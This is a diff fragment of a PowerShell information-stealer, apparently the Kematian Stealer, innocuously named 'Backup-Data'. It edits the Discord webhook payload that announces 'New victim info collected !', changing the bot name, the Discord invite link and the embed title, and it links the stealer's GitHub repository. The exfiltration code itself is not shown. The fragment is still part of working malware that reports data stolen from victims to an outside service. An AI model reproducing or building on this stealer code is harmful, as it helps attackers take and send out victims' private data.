@@ -1250,10 +1250,10 @@ function Backup-Data {
         "username"   = "Stealer vietnam"
         "color"      = "15105570"
         "avatar_url" = "$avatar"
-        "url"        = "https://discord.gg/KTTnjy2E"
+        "url"        = "https://discord.com/invite/hgtAYDGgT6"
         "embeds"     = @(
             @{
-                "title"       = "Stealer vietnam"
+                "title"       = "Kematian"
                 "url"         = "https://github.com/adasdasdsaf/Kematian-Stealer"
                 "description" = "New victim info collected !"
                 "color"       = "15105570"
